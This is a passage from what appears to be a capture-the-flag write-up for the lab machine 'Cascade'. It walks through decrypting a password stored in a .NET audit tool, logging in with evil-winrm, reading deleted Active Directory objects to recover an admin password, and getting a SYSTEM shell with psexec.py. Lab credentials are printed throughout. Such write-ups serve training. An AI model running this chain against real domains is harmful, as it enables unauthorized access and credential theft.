<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
				<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
				<span class="p">{</span>
					<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteDataReader</span> <span class="n">sqliteDataReader</span> <span class="p">=</span> <span class="n">sqliteCommand</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">())</span>
					<span class="p">{</span>
						<span class="n">sqliteDataReader</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
						<span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Uname&#34;</span><span class="p">]);</span>
						<span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Domain&#34;</span><span class="p">]);</span>
						<span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Pwd&#34;</span><span class="p">]);</span>
						<span class="k">try</span>
						<span class="p">{</span>
							<span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
						<span class="p">}</span>
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
</code></pre></div><p>The interesting part in the code above is, of course, the password decrypt line. Now because I only need the decrypt function, I could remove all the codes and put only this line below on the main function and then print it out using <code>Console.Write()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
</code></pre></div><h4 id="decrypt-password">Decrypt Password</h4>
<p>First, I&rsquo;ll enter edit mode on the current main function</p>
<p><div class="img-container"><img src="imgs/image-20210423235935774.png" alt="image-20210423235935774"  /></div>
</p>
<p>Then, I could only use the decrypt function in the main function. So the main function code now looks like this.</p>
<p><div class="img-container"><img src="imgs/image-20210424000216346.png" alt="image-20210424000216346"  /></div>
</p>
<p>I&rsquo;ll save it as a new program called <code>CascAuditModified.exe</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210424000500081.png" alt="image-20210424000500081"  /></div>
</p>
<p>Now if I run it, I get the decrypted password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">┌─「iamf@MSI」 ‣ 「/mnt/z/Shared/Audit$」 ᓚᘏᗢ <span class="o">[</span>172.17.146.164<span class="o">]</span>
└─╼$ ./CascAuditModified.exe
w3lc0meFr31nd
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210424000707924.png" alt="image-20210424000707924"  /></div>
</p>
<h4 id="remote-access---arksvc">Remote Access - Arksvc</h4>
<p>From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ evil-winrm -i cascade.htb -u arksvc -p <span class="s1">&#39;w3lc0meFr31nd&#39;</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt;
</code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I&rsquo;ll wrap it up:</p>
<p>First, recall from RPC enumeration that user <code>ArkSvc</code> is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.</p>
<p>Second, according to the email sent by Steve Smith, there is a temporary admin account called <code>TempAdmin</code> that uses the same password as the &ldquo;normal&rdquo; admin account.</p>
<p><div class="img-container"><img src="imgs/image-20210424003416214.png" alt="image-20210424003416214"  /></div>
</p>
<p>But, based on <code>ArkAdRecycleBin.log</code>, <code>TempAdmin</code> has been moved into AD Recycle Bin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;snip&gt;...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</code></pre></div><p>And now using <code>ArksSvc</code> account, I can search all the deleted objects using the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-filter</span> <span class="s1">&#39;isDeleted -eq $true&#39;</span> <span class="n">-includeDeletedObjects</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="n">-includeDeletedObjects</span> <span class="n">-SearchBase</span> <span class="s2">&#34;DC=cascade,DC=local&#34;</span>
</code></pre></div><p>After looking through the output, I noticed that <code>TempAdmin</code> has one interesting properties. It is another <code>cascadeLegacyPwd</code>.</p>
<p><img src="imgs/image-20210424004624882.png" alt="image-20210424004624882" style="zoom:80%;" /></p>
<p>I can decode the value to plaintext</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ <span class="nb">echo</span> <span class="s1">&#39;YmFDVDNyMWFOMDBkbGVz&#39;</span> <span class="p">|</span> base64 -d
baCT3r1aN00dles
</code></pre></div><p><code>TempAdmin:baCT3r1aN00dles</code></p>
<h4 id="remote-access---nt-authoritysystem">Remote Access - NT Authority\System</h4>
<p>The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\System using <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ psexec.py cascade.local/administrator:<span class="s1">&#39;baCT3r1aN00dles&#39;</span>@cascade.htb
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210424005142127.png" alt="image-20210424005142127"  /></div>
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin">https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
